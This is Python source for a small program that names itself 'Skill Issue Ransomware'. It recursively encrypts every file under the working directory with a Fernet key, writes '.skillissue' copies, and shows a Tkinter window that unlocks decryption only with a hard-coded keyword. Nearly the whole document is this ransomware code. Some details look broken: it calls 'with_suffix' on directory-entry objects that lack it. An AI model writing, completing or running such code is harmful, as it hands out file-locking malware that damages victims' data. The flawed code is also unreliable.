import os
from pathlib import Path
from cryptography.fernet import Fernet
import tkinter as tk
from tkinter import filedialog

def generate_symmetric_key():
    return Fernet.generate_key()

def encrypt(dataFile, symmetric_key):
    if dataFile.name.endswith('.skillissue'):
        return

    with open(dataFile, 'rb') as f:
        data = f.read()

    cipher_suite = Fernet(symmetric_key)
    encrypted_data = cipher_suite.encrypt(data)

    encrypted_file = dataFile.with_suffix('.skillissue')
    with open(encrypted_file, 'wb') as f:
        f.write(encrypted_data)

def decrypt(dataFile, symmetric_key):
    if not dataFile.name.endswith('.skillissue'):
        return

    with open(dataFile, 'rb') as f:
        encrypted_data = f.read()

    cipher_suite = Fernet(symmetric_key)
    decrypted_data = cipher_suite.decrypt(encrypted_data)

    decrypted_file = dataFile.with_suffix('')
    with open(decrypted_file, 'wb') as f:
        f.write(decrypted_data)

def scanRecurse(baseDir):
    for entry in os.scandir(baseDir):
        if entry.is_file():
            yield entry
        elif entry.is_dir():
            yield from scanRecurse(entry.path)

def verify_keyword(keyword):
    # Modify this function to check if the keyword is correct
    return keyword == "ratio" 

# Generate a symmetric key (store it securely)
symmetric_key = generate_symmetric_key()

# Encrypt all files in the current directory and its subdirectories
directory = './'  # Change this to the directory containing the files to be encrypted
for item in scanRecurse(directory):
    encrypt(item, symmetric_key)

# GUI to ask the user to enter the keyword for decryption
root = tk.Tk()
root.title('Skill Issue Ransomware')
root.geometry('500x200')

key_label = tk.Label(root, text="Enter the decryption keyword:")
key_label.pack()

keyword_entry = tk.Entry(root, width=60)
keyword_entry.pack(pady=10)

error_label = tk.Label(root, text="", fg="red")
error_label.pack()

def submit_keyword():
    keyword = keyword_entry.get()
    if verify_keyword(keyword):
        decrypt_with_symmetric_key(symmetric_key)
        print("Decryption completed successfully.")
    else:
        error_label.config(text="Incorrect keyword. Decryption cannot be performed.", fg="red")

def decrypt_with_symmetric_key(symmetric_key):
    # Decrypt all skillissue files in the current directory and its subdirectories
    directory = './'  # Change this to the directory containing the skillissue files
    for item in scanRecurse(directory):
        if item.name.endswith('.skillissue'):
            decrypt(item, symmetric_key)

submit_button = tk.Button(root, text="Submit", command=submit_keyword)
submit_button.pack()

root.mainloop()
